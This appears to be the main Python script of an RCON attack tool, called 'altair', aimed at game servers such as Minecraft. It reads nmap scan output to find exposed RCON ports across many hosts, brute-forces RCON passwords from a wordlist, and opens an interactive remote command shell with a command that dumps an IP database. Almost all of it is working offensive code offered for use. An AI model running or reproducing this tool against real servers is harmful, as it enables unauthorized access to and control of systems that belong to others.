import colorama
import argparse
import hashlib
import socket
import struct
import msvcrt
import string
import uuid
import time
import sys
import re

from colorama import *
from mcstatus import *


from core.commands.dbdump import *
from core.utils.print_utils import *
from core.utils.packet_utils import *

colorama.init()

help = {
    ':help': 'show this menu',
    ':dbdump': 'dump ip database',
    ':clear': 'clear the console screen',
    ':logout': 'terminate session',
}

print_banner()

parser = argparse.ArgumentParser(usage='%(prog)s [options]')

scan = parser.add_argument_group('SCANNING')
scan.add_argument('-f', '--file', help='nmap output file', dest='path', metavar='')
scan.add_argument('-o', '--output', help='output file', dest='output', metavar='')

target_config = parser.add_argument_group('TARGET CONFIG')
target_config.add_argument('-i', '--target', help='set target host', dest='host', metavar='')
target_config.add_argument('-p', '--port', help='set target port', dest='port', metavar='')
target_config.add_argument('-t', '--timeout', help='set socket timeout', dest='timeout', metavar='')

exec = parser.add_argument_group('EXECUTING COMMANDS')
exec.add_argument('-x', '--exec', help='start altair rcon shell', dest='exec', action='store_true')

brute = parser.add_argument_group('BRUTING')
brute.add_argument('-w', '--wordlist', help='list of passwords', dest='bpath', metavar='')
brute.add_argument('-v', '--verbose', help='verbose mode', dest='verbose', action='store_true')


args = parser.parse_args()


if not args.path and not args.host:
    parser.print_help()
    sys.exit(0)

if args.bpath:
    try:
        passwords = [x.strip() for x in open(args.bpath, errors='ignore').readlines()]
    except:
        print_failed('can\'t get passwords')
        sys.exit(0)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
    	s.connect((args.host, int(args.port)))
    except:
    	print_failed('can\'t connect to the target')
    	sys.exit(0)

    print_loading('bruting...')
    t = 0
    for payload in passwords:
        packet = login_packet(payload)
        s.sendall(packet)
        data = s.recv(1024)
        if data == LOGIN_SUCCESS:
            print_success(f'password found after {t} tries: {payload}')
            sys.exit(0)
        elif data == LOGIN_FAILED:
            if args.verbose == True:
                print_failed(f'invalid password: {payload}')
        t += 1
    sys.exit(0)
    

if args.path:
    if not args.timeout:
        timeout = 500 / 1000
    else:
        timeout = int(args.timeout) / 1000

    ips = {}

    try:
        with open(args.path) as f:
            content = f.read(); reports = content.split('Nmap scan report for ')
            for report in reports:
                try: 
                    ip_addr = re.search(r'[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}', report).group(0)
                    ports = re.findall(r'(\d{1,5})/.{1,5}\s+open\s+.*', report)
                    ips[ip_addr] = ports
                except: 
                    pass
    except:
        print_failed('invalid file path.')
        sys.exit(0)

    if ips == {}:
        print_failed(f'0 ips loaded, are you sure \'{sys.argv[1]}\' is a nmap output file (-oN)')
        sys.exit()

    rcons = []

    print_loading('discovering rcons servers...')

    for _host, ports in ips.items():
        for port in ports:
            if args.verbose == True:
                print_loading(f'trying {Fore.CYAN}{_host}:{port}')
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)       
                s.connect((_host, int(port)))
                s.sendall(login_packet("123impOsSibL3p@ssw0rd1337"))
                data = s.recv(1024)
                if data == LOGIN_SUCCESS or data == LOGIN_FAILED:
                    print_success(f'rcon server found on {Fore.CYAN}{_host}:{port}')
                    rcons.append((_host, int(port)))
            except Exception as e:
                pass

    if args.output:
        with open(args.output, 'a+') as f:
            for (host, port) in rcons:
                f.write(f'{host}:{port}\n')
        print_success(f'{len(rcons)} ips saved in \'{args.output}\'')

if args.host and args.port and args.exec == True:
    host = args.host
    port = args.port

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, int(port)))
    except:
        print_failed(f'can\'t reach {host}:{port}')
        sys.exit(0)

    connected = None

    for x in range(5):
        connected = False
        password = ''
        proxy_string = [' '] * 64
        while True:
            sys.stdout.write('\x0D' + 'Password: ' + ''.join(proxy_string))
            c = msvcrt.getch()
            if c == b'\r':
                break
            elif c == b'\x08':
                password = password[:-1]
                proxy_string[len(password)] = " "
            else:
                password += c.decode()
                proxy_string[len(password)] = "*"


        sys.stdout.write('\n')
        packet = login_packet(password)

        s.sendall(packet)

        data = s.recv(1024)

        if data == LOGIN_SUCCESS:
            connected = True
            break

        print_error('Incorrect password, please try again.')

    if not connected:
        print_error('Too many tries, quitting...')
        sys.exit(0)


    draw_string(':help to start')

    while 1:
        try:
            print(f'{Fore.WHITE}altair{Fore.GREEN}>{Fore.WHITE} ', end='')
            complete_command = input()

            args = complete_command.split()
            command = args[0].lower()

            if command == ':help':
                draw_string(help)

            elif command == ':dbdump':
                dbdump(s)

            elif command == ':clear':
                clear_console()

            elif command == ':logout':
                s.close()
                sys.exit()
            else:
                packet = command_packet(complete_command)
                s.sendall(packet)
                print(parse_string(s.recv(65500).decode('utf-8', errors='ignore')))


        except IndexError:
            pass
        except KeyboardInterrupt:
            sys.exit()